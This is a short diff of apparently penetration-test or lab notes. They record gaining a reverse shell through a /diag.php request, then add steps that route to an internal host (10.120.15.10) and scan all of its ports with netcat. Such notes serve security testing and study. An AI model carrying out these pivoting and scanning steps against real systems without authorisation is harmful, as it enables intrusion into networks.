@@ -31,4 +31,8 @@ OSAwPiYxCg==
 request to /diag.php with check
 got the reverse shell
 
-7.
+7.10.120.15.10 added to the route map
+
+8.nc -zv 10.120.15.10 1-65535 2>&1 | grep succeed
+
+
